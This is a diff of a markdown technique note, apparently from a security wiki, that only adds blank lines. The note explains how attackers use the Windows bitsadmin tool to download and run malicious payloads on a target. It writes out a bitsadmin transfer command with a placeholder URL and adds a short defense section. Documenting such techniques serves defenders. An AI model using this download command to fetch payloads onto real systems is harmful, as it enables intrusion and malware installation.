@@ -36,11 +36,17 @@ Technical Explanation:
 Business Value:
 This technique can be used by attackers to gain access to sensitive data, steal credentials or install additional malware on the target system. It can cause significant damage to the victim's reputation and financial losses.
 
+
+
+ 
+
 ## Requirements
 
 1. Access to the command-line interface of the target system
 
 1. BITSAdmin tool installed on the target system
+
+ 
 
 ## Defense
 
@@ -50,9 +56,13 @@ This technique can be used by attackers to gain access to sensitive data, steal 
 
 1. Monitor network traffic for suspicious activity
 
+ 
+
 ## Objectives
 
 1. Download and execute malicious payloads on the target system
+
+ 
 
 # Instructions
 
@@ -62,7 +72,13 @@ bitsadmin /transfer mydownloadjob /download /priority normal <URL> <destination_
 
 Replace <URL> with the URL of the file you want to download and <destination_path> with the path where you want to save the file on your system. You can also specify a custom name for the job by replacing 'mydownloadjob' with a name of your choice.
 
+ 
+
+
+
 **Code**: [[bitsadmin /transfer mydownloadjob /download /prior]]
+
+
 
 > This command uses the Bitsadmin tool to download a file from a remote server. The /transfer option creates a new job and /download specifies that the job is for downloading a file. The /priority option sets the priority of the job to normal. The first argument after the options is the URL of the file to download and the second argument is the destination path where the file will be saved on the local system. The %USERNAME% variable is used to specify the current user's username in the destination path. This command can be used by attackers to download malicious files onto a victim's system.
 
@@ -81,3 +97,5 @@ Replace <URL> with the URL of the file you want to download and <destination_pat
 
 - [[Bitsadmin]]
 - [[Windows - Download and execute methods]]
+
+
